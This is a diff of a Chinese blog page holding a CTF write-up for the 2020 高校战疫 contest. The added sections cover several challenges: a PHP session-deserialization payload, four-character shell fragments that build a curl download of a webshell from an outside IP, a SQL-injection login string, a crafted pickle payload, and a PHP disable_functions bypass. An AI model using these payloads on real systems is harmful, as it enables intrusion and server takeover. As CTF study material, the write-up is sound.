@@ -55,16 +55,18 @@
   };
 </script>
 
-  <meta name="description" content="web1.hackme打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有www.zip，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参|O:4:&amp;quot;info&amp;quot;:2:{s:5:&amp;quot;admin&amp;quot;;i:1;s:4:&amp;quot;sign&amp;quot;;s:1:&amp;quot;a&amp;quot;;">
+  <meta name="description" content="前言，现在看了nepnep的writeup，有很多当时有想法没完成的，现在补一下。web1.hackme打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有www.zip，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参|O:4:&amp;quot;info&amp;quot;:2:{s:5:&amp;quot;admin&amp;quot;;i:">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="高校战疫网络安全分享赛部分wp">
 <meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2020&#x2F;03&#x2F;07&#x2F;%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B&#x2F;index.html">
 <meta property="og:site_name" content="LiM&#39;s blog">
-<meta property="og:description" content="web1.hackme打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有www.zip，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参|O:4:&amp;quot;info&amp;quot;:2:{s:5:&amp;quot;admin&amp;quot;;i:1;s:4:&amp;quot;sign&amp;quot;;s:1:&amp;quot;a&amp;quot;;">
+<meta property="og:description" content="前言，现在看了nepnep的writeup，有很多当时有想法没完成的，现在补一下。web1.hackme打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有www.zip，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参|O:4:&amp;quot;info&amp;quot;:2:{s:5:&amp;quot;admin&amp;quot;;i:">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-03-08T06:36:43.861Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2020&#x2F;03&#x2F;07&#x2F;%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B&#x2F;1583741355647.png">
+<meta property="og:updated_time" content="2020-03-10T02:53:45.866Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2020&#x2F;03&#x2F;07&#x2F;%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B&#x2F;1583741355647.png">
   <link rel="canonical" href="https://li1m.github.io/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/">
 
 
@@ -304,7 +306,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-03-08 14:36:43" itemprop="dateModified" datetime="2020-03-08T14:36:43+08:00">2020-03-08</time>
+                <time title="Modified: 2020-03-10 10:53:45" itemprop="dateModified" datetime="2020-03-10T10:53:45+08:00">2020-03-10</time>
               </span>
             
           
@@ -326,7 +328,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>2k</span>
+              <span>2.7k</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -349,7 +351,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>web</p><p>1.hackme<br>打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有<code>www.zip</code>，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参<code>|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:1:&quot;a&quot;;}</code> 跳转./core/index.php</p><a id="more"></a>
+        <p>前言，现在看了nepnep的writeup，有很多当时有想法没完成的，现在补一下。</p><p>web</p><p>1.hackme<br>打开页面，随便翻了一下，admin可以登录，有个框随便测了下，没什么发现，扫了一下目录有<code>www.zip</code>，找到了网站源码，看了一下，在profile.php，有session反序列化。所以sign传参<code>|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:1:&quot;a&quot;;}</code> 跳转./core/index.php</p><a id="more"></a>
+
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span><br><span class="line">            redirect(<span class="string">'./core/index.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line"><span class="meta">?&gt;</span>	<span class="comment">//profile.php</span></span><br></pre></td></tr></table></figure>
 
@@ -358,7 +361,14 @@
 <p>这个和hitcon-ctf-2017/babyfirst-revenge-v2差不多，url的过滤可以用<code>url=compress.zlib://data:@127.0.0.1/,xxxx</code> 后面接要执行的命令要在四个字符内。具体命令构造参考 <a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py" target="_blank" rel="noopener">hitcon-ctf-2017官方wp</a> 我的payload如下，下载一句话到所在目录，最后在根目录找到flag。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt; </span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">&gt;p</span><br><span class="line">&gt;ph\</span><br><span class="line">&gt;b.\</span><br><span class="line">&gt;\&gt;\</span><br><span class="line">&gt;0\</span><br><span class="line">&gt;08\</span><br><span class="line">&gt;:8\</span><br><span class="line">&gt;94\</span><br><span class="line">&gt;2.\</span><br><span class="line">&gt;6\</span><br><span class="line">&gt;3.\</span><br><span class="line">&gt;10\</span><br><span class="line">&gt;7.\</span><br><span class="line">&gt;4\</span><br><span class="line">&gt;\+\</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh+x</span><br><span class="line">sh+g</span><br></pre></td></tr></table></figure>
 
-<p>2.sqlcheckin<br>用户名admin，密码1’-‘1就可以，当查询为0时返回所有数据</p>
+<p>2.sqlcheckin<br>用户名admin，密码1’-‘1或’-‘就可以，当查询为0时返回所有数据</p>
+<p>3.webtmp<br>这个题目是按照这个出的 <a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">传送门</a> 我昨天看了一下，一直在尝试rce，可惜不行，没想到是修改secret里的属性，思路太局限。payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b'\x80\x03c__main__\nsecret\n&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x08\x00\x00\x00categoryX\x03\x00\x00\x00wwwub0c__main__\nAnimal\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x08\x00\x00\x00categoryX\x03\x00\x00\x00wwwub.'</span></span><br><span class="line">//	base64编码后的数据gANjX19tYWluX18Kc2VjcmV0Cn0oWAQAAABuYW1lWAMAAABydWFYCAAAAGNhdGVnb3J5WAMAAAB3d3d1YjBjX19tYWluX18KQW5pbWFsCimBfShYBAAAAG5hbWVYAwAAAHJ1YVgIAAAAY2F0ZWdvcnlYAwAAAHd3d3ViLg==</span><br></pre></td></tr></table></figure>
+
+<p><img src="1583741355647.png" alt="1583741355647"></p>
+<p>4.PHP-UAF<br>bypass disable_function执行命令，用这个师傅的exp <a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">传送门</a> ，包含执行命令即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=$it=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;printf(<span class="string">"%s "</span>,$f-&gt;getFilename());&#125;</span><br><span class="line"><span class="comment">//	查看根目录结构</span></span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -502,14 +512,14 @@
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
     
-    <span title="Symbols count total">85k</span>
+    <span title="Symbols count total">88k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
     
-    <span title="Reading time total">1:18</span>
+    <span title="Reading time total">1:20</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
   </div>
